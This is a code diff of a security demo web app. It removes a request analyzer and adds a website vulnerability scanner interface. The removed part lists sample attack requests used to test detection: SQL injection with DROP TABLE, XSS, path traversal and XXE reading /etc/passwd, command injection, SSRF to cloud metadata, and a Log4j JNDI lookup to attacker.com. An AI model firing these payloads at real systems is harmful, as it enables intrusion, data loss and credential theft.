-    sqlInjectionStacked: `GET /products?id=1; DROP TABLE users HTTP/1.1
-Host: vulnerable.lab`,
-    
-    // A03: XSS Attacks
-    xssScript: `GET /search?q=<script>alert('XSS')</script> HTTP/1.1
-Host: vulnerable.lab`,
-    
-    xssImage: `GET /products?category=<img src=x onerror=alert(1)> HTTP/1.1
-Host: vulnerable.lab`,
-
-    xssComment: `POST /comment HTTP/1.1
-Host: vulnerable.lab
-Content-Type: application/x-www-form-urlencoded
-
-comment=<script>alert('XSS')</script>`,
-    
-    xssAdvanced: `GET /search?q=<details open ontoggle=Function('ale'+'rt(1)')()> HTTP/1.1
-Host: vulnerable.lab`,
-    
-    // A03: Path Traversal
-    pathTraversal: `GET /download?file=../../../../etc/passwd HTTP/1.1
-Host: vulnerable.lab`,
-    
-    pathTraversalEncoded: `GET /download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1
-Host: vulnerable.lab`,
-    
-    // A03: Command Injection
-    commandInjection: `GET /ping?host=127.0.0.1;ls HTTP/1.1
-Host: vulnerable.lab`,
-    
-    commandInjectionBacktick: `GET /ping?host=\`whoami\` HTTP/1.1
-Host: vulnerable.lab`,
-    
-    // A01: Broken Access Control
-    adminAccess: `GET /admin HTTP/1.1
-Host: vulnerable.lab`,
-    
-    privilegeEscalation: `GET /api/users?role=admin HTTP/1.1
-Host: vulnerable.lab`,
-    
-    // A05: Security Misconfiguration
-    gitExposure: `GET /.git/config HTTP/1.1
-Host: vulnerable.lab`,
-    
-    envFile: `GET /.env HTTP/1.1
-Host: vulnerable.lab`,
-    
-    phpInfo: `GET /phpinfo.php HTTP/1.1
-Host: vulnerable.lab`,
-    
-    // A06: Vulnerable Components
-    log4jExploit: `GET /api/search?query=\${jndi:ldap://attacker.com/x} HTTP/1.1
-Host: vulnerable.lab`,
-    
-    // A07: Authentication Failures
-    weakPassword: `POST /api/login HTTP/1.1
-Host: vulnerable.lab
-Content-Type: application/json
-
-{"username":"admin","password":"123456"}`,
-    
-    defaultCredentials: `POST /login HTTP/1.1
-Host: vulnerable.lab
-Content-Type: application/x-www-form-urlencoded
-
-username=admin&password=admin`,
-    
-    // A10: Server-Side Request Forgery (SSRF)
-    ssrfInternal: `GET /fetch?url=http://127.0.0.1:8080/admin HTTP/1.1
-Host: vulnerable.lab`,
-    
-    ssrfMetadata: `GET /fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
-Host: vulnerable.lab`,
-    
-    ssrfFile: `GET /fetch?url=file:///etc/passwd HTTP/1.1
-Host: vulnerable.lab`,
-    
-    // Encoded Attacks
-    urlEncodedSqli: `GET /search?q=%27%20OR%20%271%27%3D%271 HTTP/1.1
-Host: vulnerable.lab`,
-    
-    hexEncodedSqli: `GET /search?q=\\x27\\x20OR\\x20\\x31\\x3D\\x31 HTTP/1.1
-Host: vulnerable.lab`,
-    
-    // XXE Attack
-    xxeAttack: `POST /api/data HTTP/1.1
-Host: vulnerable.lab
-Content-Type: application/xml
-
-<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
-    
-    // NoSQL Injection
-    nosqlInjection: `POST /api/login HTTP/1.1
-Host: vulnerable.lab
-Content-Type: application/json
-
-{"username":"admin","password":{"$ne":""}}`
+  const getSeverityBadge = (severity: string) => {
+    switch (severity) {
+      case "Critical": return "destructive";
+      case "High": return "default";
+      case "Medium": return "secondary";
+      case "Low": return "outline";
+      default: return "outline";
+    }
   };
 
   return (
-    <div className="min-h-screen bg-gradient-dark">
-      {/* Navigation */}
-      <nav className="fixed top-0 w-full bg-background/80 backdrop-blur-md border-b border-border z-50">
-        <div className="container mx-auto px-4 h-16 flex items-center justify-between">
-          <Link to="/" className="flex items-center space-x-2">
-            <ArrowLeft className="h-5 w-5 text-muted-foreground" />
-            <Shield className="h-8 w-8 text-primary" />
-            <span className="text-xl font-bold gradient-text">SentinelX</span>
+    <div className="min-h-screen bg-gradient-to-b from-background via-background to-muted/20">
+      <div className="container mx-auto px-4 py-8 max-w-7xl">
+        {/* Header */}
+        <div className="flex items-center justify-between mb-8">
+          <Link to="/">
+            <Button variant="ghost" size="sm">
+              <ArrowLeft className="mr-2 h-4 w-4" />
+              Back to Home
+            </Button>
           </Link>
-          
-          <Badge variant="secondary" className="glow-cyber">
-            <Scan className="h-4 w-4 mr-2" />
-            Security Demo
-          </Badge>
-        </div>
-      </nav>
-
-      {/* Main Content */}
-      <div className="pt-20 pb-12 px-4">
-        <div className="container mx-auto max-w-6xl">
-          <div className="text-center mb-12">
-            <h1 className="text-4xl md:text-5xl font-bold mb-6">
-              <span className="gradient-text">Security Request</span> Analyzer
-            </h1>
-            <p className="text-xl text-muted-foreground max-w-3xl mx-auto">
-              Test requests for security vulnerabilities including SQL injection, XSS, CSRF, and other threats using both signature-based and ML-powered detection.
-            </p>
+          <div className="flex items-center gap-2">
+            <Shield className="h-6 w-6 text-primary" />
+            <h1 className="text-2xl font-bold">Security Scanner Demo</h1>
           </div>
+        </div>
 
-          <div className="grid lg:grid-cols-2 gap-8">
-            {/* Input Section */}
-            <Card className="bg-card/50 border-border/50">
-              <CardHeader>
-                <CardTitle className="flex items-center">
-                  <Eye className="h-5 w-5 mr-2 text-primary" />
-                  Request Input
-                </CardTitle>
-                <CardDescription>
-                  Paste your request below to analyze for security threats
-                </CardDescription>
-              </CardHeader>
-              <CardContent className="space-y-4">
-                <Textarea
-                  placeholder="Paste your request here..."
-                  value={request}
-                  onChange={(e) => setRequest(e.target.value)}
-                  className="min-h-[300px] font-mono text-sm"
+        {/* Scan Input */}
+        <Card className="mb-8">
+          <CardHeader>
+            <CardTitle className="flex items-center gap-2">
+              <Globe className="h-5 w-5" />
+              Website Vulnerability Scanner
+            </CardTitle>
+            <CardDescription>
+              Enter a website URL to perform a comprehensive security analysis
+            </CardDescription>
+          </CardHeader>
+          <CardContent>
+            <div className="flex gap-4">
+              <div className="flex-1">
+                <Input
+                  type="url"
+                  placeholder="https://example.com"
+                  value={targetUrl}
+                  onChange={(e) => setTargetUrl(e.target.value)}
+                  disabled={isScanning}
+                  className="text-base"
                 />
-                
-                <div className="flex gap-2">
-                  <Button 
-                    onClick={analyzeRequest}
-                    disabled={!request?.trim() || isAnalyzing}
-                    className="btn-hero"
-                  >
-                    {isAnalyzing ? (
-                      <>
-                        <Zap className="h-4 w-4 mr-2 animate-spin" />
-                        Analyzing...
-                      </>
-                    ) : (
-                      <>
-                        <Scan className="h-4 w-4 mr-2" />
-                        Analyze Request
-                      </>
-                    )}
-                  </Button>
-                </div>
-
-                {/* Example Requests */}
-                <div className="space-y-2">
-                  <p className="text-sm font-medium">Quick Examples:</p>
-                  <div className="grid grid-cols-2 gap-2">
-                    {/* Valid Requests */}
-                    <div className="space-y-1">
-                      <p className="text-xs text-muted-foreground font-medium">✅ Valid Requests</p>
-                      <div className="flex flex-col gap-1">
-                        <Button
-                          variant="outline"
-                          size="sm"
-                          onClick={() => setRequest(exampleRequests.homepage)}
-                          className="text-xs"
-                        >
-                          Homepage
-                        </Button>
-                        <Button
-                          variant="outline"
-                          size="sm"
-                          onClick={() => setRequest(exampleRequests.productListing)}
-                          className="text-xs"
-                        >
-                          Product Listing
-                        </Button>
-                      </div>
-                    </div>
-
-                    {/* Malicious Requests */}
-                    <div className="space-y-1">
-                      <p className="text-xs text-muted-foreground font-medium">❌ Malicious Requests</p>
-                      <div className="flex flex-col gap-1">
-                        <Button
-                          variant="outline"
-                          size="sm"
-                          onClick={() => setRequest(exampleRequests.sqlInjectionOR)}
-                          className="text-xs"
-                        >
-                          SQL Injection
-                        </Button>
-                        <Button
-                          variant="outline"
-                          size="sm"
-                          onClick={() => setRequest(exampleRequests.xssScript)}
-                          className="text-xs"
-                        >
-                          XSS Attack
-                        </Button>
-                        <Button
-                          variant="outline"
-                          size="sm"
-                          onClick={() => setRequest(exampleRequests.urlEncodedSqli)}
-                          className="text-xs"
-                        >
-                          Encoded Attack
-                        </Button>
-                        <Button
-                          variant="outline"
-                          size="sm"
-                          onClick={() => setRequest(exampleRequests.xssAdvanced)}
-                          className="text-xs"
-                        >
-                          Advanced XSS
-                        </Button>
-                      </div>
-                    </div>
-                  </div>
-                </div>
-              </CardContent>
-            </Card>
-
-            {/* Analysis Results */}
-            <Card className="bg-card/50 border-border/50">
-              <CardHeader>
-                <CardTitle className="flex items-center">
-                  <Brain className="h-5 w-5 mr-2 text-secondary" />
-                  Security Analysis
-                </CardTitle>
-                <CardDescription>
-                  Real-time threat detection and risk assessment
-                </CardDescription>
-              </CardHeader>
-              <CardContent>
-                {!analysis ? (
-                  <div className="text-center py-12 text-muted-foreground">
-                    <Shield className="h-12 w-12 mx-auto mb-4 opacity-50" />
-                    <p>Submit a request to see security analysis</p>
-                  </div>
+              </div>
+              <Button 
+                onClick={handleScan} 
+                disabled={isScanning || !targetUrl.trim()}
+                size="lg"
+              >
+                {isScanning ? (
+                  <>
+                    <Scan className="mr-2 h-4 w-4 animate-spin" />
+                    Scanning...
+                  </>
                 ) : (
-                  <div className="space-y-6">
-                    {/* Risk Score */}
-                    <div className="flex items-center justify-between p-4 bg-muted/50 rounded-lg">
-                      <div>
-                        <p className="text-sm text-muted-foreground">Risk Score</p>
-                        <p className="text-2xl font-bold">
-                          <span className={analysis.riskScore === 0 ? "text-secondary" : 
-                                         analysis.riskScore < 50 ? "text-yellow-500" : "text-destructive"}>
-                            {analysis.riskScore}/100
-                          </span>
-                        </p>
-                      </div>
-                      <div className="text-right">
-                        <Badge variant={analysis.isClean ? "secondary" : "destructive"}>
-                          {analysis.isClean ? "Clean" : "Threats Detected"}
-                        </Badge>
-                        <p className="text-xs text-muted-foreground mt-1">
-                          {analysis.detectionMethod}
-                        </p>
-                      </div>
-                    </div>
-
-                    {/* Threats List */}
-                    {analysis.threats.length === 0 ? (
-                      <Alert>
-                        <CheckCircle className="h-4 w-4" />
-                        <AlertDescription>
-                          No security threats detected. This request appears to be safe.
-                        </AlertDescription>
-                      </Alert>
-                    ) : (
-                      <div className="space-y-3">
-                        <p className="font-medium text-destructive">
-                          {analysis.threats.length} threat(s) detected:
-                        </p>
-                        {analysis.threats.map((threat, index) => (
-                          <Alert key={index} variant="destructive">
-                            <AlertTriangle className="h-4 w-4" />
-                            <AlertDescription>
-                              <div className="space-y-1">
-                                <div className="flex items-center justify-between">
-                                  <span className="font-medium">{threat.type}</span>
-                                  <Badge variant={
-                                    threat.severity === "critical" ? "destructive" :
-                                    threat.severity === "high" ? "destructive" :
-                                    threat.severity === "medium" ? "secondary" : "outline"
-                                  }>
-                                    {threat.severity.toUpperCase()}
-                                  </Badge>
-                                </div>
-                                <p className="text-sm">{threat.description}</p>
-                                <p className="text-xs text-muted-foreground">
-                                  Location: {threat.location}
-                                </p>
-                              </div>
-                            </AlertDescription>
-                          </Alert>
-                        ))}
-                      </div>
-                    )}
-                  </div>
+                  <>
+                    <Scan className="mr-2 h-4 w-4" />
+                    Start Scan
+                  </>
                 )}
+              </Button>
+            </div>
+
+            {/* Progress Bar */}
+            {isScanning && (
+              <div className="mt-6 space-y-2">
+                <Progress value={scanProgress} className="h-2" />
+                <p className="text-sm text-muted-foreground flex items-center gap-2">
+                  <Server className="h-4 w-4 animate-pulse" />
+                  {currentScanPhase}
+                </p>
+              </div>
+            )}
+          </CardContent>
+        </Card>
+
+        {/* Scan Results */}
+        {scanResult && (
+          <div className="space-y-6">
+            {/* Success Alert */}
+            <Alert className="border-green-500 bg-green-50 dark:bg-green-950">
+              <CheckCircle className="h-4 w-4 text-green-600" />
+              <AlertDescription className="text-green-800 dark:text-green-200">
+                ✅ Scan Completed. Vulnerability report generated successfully.
+              </AlertDescription>
+            </Alert>
+
+            {/* Overview Card */}
+            <Card>
+              <CardHeader>
+                <CardTitle className="flex items-center justify-between">
+                  <span className="flex items-center gap-2">
+                    <FileText className="h-5 w-5" />
+                    Website Vulnerability Report
+                  </span>
+                  <Button onClick={generatePDF} variant="outline" size="sm">
+                    <Download className="mr-2 h-4 w-4" />
+                    Download PDF Report
+                  </Button>
+                </CardTitle>
+              </CardHeader>
+              <CardContent className="space-y-6">
+                {/* Report Header */}
+                <div className="grid grid-cols-2 md:grid-cols-4 gap-4 p-4 bg-muted/50 rounded-lg">
+                  <div>
+                    <p className="text-sm text-muted-foreground">Target</p>
+                    <p className="font-medium truncate">{scanResult.target}</p>
+                  </div>
+                  <div>
+                    <p className="text-sm text-muted-foreground">Scan Date</p>
+                    <p className="font-medium">{scanResult.scanDate}</p>
+                  </div>
+                  <div>
+                    <p className="text-sm text-muted-foreground">Security Score</p>
+                    <p className="font-bold text-2xl">{scanResult.securityScore}/100</p>
+                  </div>
+                  <div>
+                    <p className="text-sm text-muted-foreground">Risk Level</p>
+                    <Badge variant={scanResult.riskLevel === "Critical" || scanResult.riskLevel === "High" ? "destructive" : "secondary"}>
+                      {scanResult.riskLevel}
+                    </Badge>
+                  </div>
+                </div>
+
+                {/* Summary */}
+                <div>
+                  <h3 className="text-lg font-semibold mb-3 flex items-center gap-2">
+                    <Shield className="h-5 w-5" />
+                    Summary of Findings
+                  </h3>
+                  <div className="space-y-2 text-sm">
+                    <p>Total vulnerabilities detected: <span className="font-bold">{scanResult.vulnerabilities.length}</span></p>
+                    <div className="flex gap-4">
+                      <span className="text-destructive font-semibold">{scanResult.totalFindings.critical} Critical</span>
+                      <span className="text-orange-500 font-semibold">{scanResult.totalFindings.high} High</span>
+                      <span className="text-yellow-500 font-semibold">{scanResult.totalFindings.medium} Medium</span>
+                      <span className="text-blue-500 font-semibold">{scanResult.totalFindings.low} Low</span>
+                    </div>
+                    <p>SSL certificate valid until: <span className="font-medium">{scanResult.sslValid}</span></p>
+                    <p>CMS detected: <span className="font-medium">{scanResult.cmsDetected}</span></p>
+                  </div>
+                </div>
+
+                {/* Vulnerability Breakdown */}
+                <div>
+                  <h3 className="text-lg font-semibold mb-4 flex items-center gap-2">
+                    <AlertTriangle className="h-5 w-5" />
+                    Vulnerability Breakdown
+                  </h3>
+                  <div className="overflow-x-auto">
+                    <table className="w-full border-collapse">
+                      <thead>
+                        <tr className="border-b bg-muted/50">
+                          <th className="text-left p-3 font-semibold">Vulnerability</th>
+                          <th className="text-left p-3 font-semibold">Severity</th>
+                          <th className="text-left p-3 font-semibold">Description</th>
+                          <th className="text-left p-3 font-semibold">Recommendation</th>
+                        </tr>
+                      </thead>
+                      <tbody>
+                        {scanResult.vulnerabilities.map((vuln, idx) => (
+                          <tr key={idx} className="border-b hover:bg-muted/30 transition-colors">
+                            <td className="p-3 font-medium">{vuln.name}</td>
+                            <td className="p-3">
+                              <Badge variant={getSeverityBadge(vuln.severity) as any}>
+                                {vuln.severity}
+                              </Badge>
+                            </td>
+                            <td className="p-3 text-sm text-muted-foreground">{vuln.description}</td>
+                            <td className="p-3 text-sm">{vuln.recommendation}</td>
+                          </tr>
+                        ))}
+                      </tbody>
+                    </table>
+                  </div>
+                </div>
+
+                {/* Risk Matrix */}
+                <div>
+                  <h3 className="text-lg font-semibold mb-4 flex items-center gap-2">
+                    <Lock className="h-5 w-5" />
+                    Risk Matrix
+                  </h3>
+                  <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
+                    <Card className="border-destructive">
+                      <CardContent className="p-4">
+                        <p className="text-sm text-muted-foreground">Critical</p>
+                        <p className="text-2xl font-bold text-destructive">{scanResult.totalFindings.critical}</p>
+                        <p className="text-xs text-muted-foreground mt-1">System Compromise</p>
+                      </CardContent>
+                    </Card>
+                    <Card className="border-orange-500">
+                      <CardContent className="p-4">
+                        <p className="text-sm text-muted-foreground">High</p>
+                        <p className="text-2xl font-bold text-orange-500">{scanResult.totalFindings.high}</p>
+                        <p className="text-xs text-muted-foreground mt-1">Data Exposure</p>
+                      </CardContent>
+                    </Card>
+                    <Card className="border-yellow-500">
+                      <CardContent className="p-4">
+                        <p className="text-sm text-muted-foreground">Medium</p>
+                        <p className="text-2xl font-bold text-yellow-500">{scanResult.totalFindings.medium}</p>
+                        <p className="text-xs text-muted-foreground mt-1">Moderate Risk</p>
+                      </CardContent>
+                    </Card>
+                    <Card className="border-blue-500">
+                      <CardContent className="p-4">
+                        <p className="text-sm text-muted-foreground">Low</p>
+                        <p className="text-2xl font-bold text-blue-500">{scanResult.totalFindings.low}</p>
+                        <p className="text-xs text-muted-foreground mt-1">Informational</p>
+                      </CardContent>
+                    </Card>
+                  </div>
+                </div>
+
+                {/* Remediation Summary */}
+                <div className="p-4 bg-muted/30 rounded-lg">
+                  <h3 className="text-lg font-semibold mb-3">🩺 Remediation Summary</h3>
+                  <ul className="space-y-2 text-sm">
+                    <li>• Update outdated CMS and frameworks immediately</li>
+                    <li>• Implement strict HTTPS enforcement with HSTS</li>
+                    <li>• Disable public debug endpoints and directory listings</li>
+                    <li>• Review and configure missing security headers</li>
+                    <li>• Conduct periodic scans to maintain security posture</li>
+                  </ul>
+                </div>
+
+                {/* Overall Verdict */}
+                <Alert variant={scanResult.riskLevel === "Critical" || scanResult.riskLevel === "High" ? "destructive" : "default"}>
+                  <AlertTriangle className="h-4 w-4" />
+                  <AlertDescription>
+                    <strong>Overall Verdict:</strong> This domain has been assessed with a security score of {scanResult.securityScore}/100.
+                    {scanResult.riskLevel === "Critical" || scanResult.riskLevel === "High" 
+                      ? " Immediate patching and security hardening are strongly advised."
+                      : " Continue monitoring and apply recommended security improvements."}
+                  </AlertDescription>
+                </Alert>
               </CardContent>
             </Card>
           </div>
-
-          {/* Detection Methods */}
-          <div className="mt-12 grid md:grid-cols-3 gap-6">
-            <Card className="bg-gradient-card border-border">
-              <CardHeader className="text-center">
-                <Shield className="h-8 w-8 text-primary mx-auto mb-2" />
-                <CardTitle className="text-lg">Signature Detection</CardTitle>
-              </CardHeader>
-              <CardContent>
-                <p className="text-sm text-muted-foreground text-center">
-                  Pattern-based detection for known attack vectors like SQL injection, XSS, and command injection
-                </p>
-              </CardContent>
-            </Card>
-
-            <Card className="bg-gradient-card border-border">
-              <CardHeader className="text-center">
-                <Brain className="h-8 w-8 text-secondary mx-auto mb-2" />
-                <CardTitle className="text-lg">ML-Based Detection</CardTitle>
-              </CardHeader>
-              <CardContent>
-                <p className="text-sm text-muted-foreground text-center">
-                  Advanced anomaly detection for encoded payloads and evasion techniques
-                </p>
-              </CardContent>
-            </Card>
-
-            <Card className="bg-gradient-card border-border">
-              <CardHeader className="text-center">
-                <Zap className="h-8 w-8 text-accent mx-auto mb-2" />
-                <CardTitle className="text-lg">Real-Time Analysis</CardTitle>
-              </CardHeader>
-              <CardContent>
-                <p className="text-sm text-muted-foreground text-center">
-                  Instant threat assessment with detailed risk scoring and remediation guidance
-                </p>
-              </CardContent>
-            </Card>
-          </div>
-        </div>
+        )}
       </div>
     </div>
   );
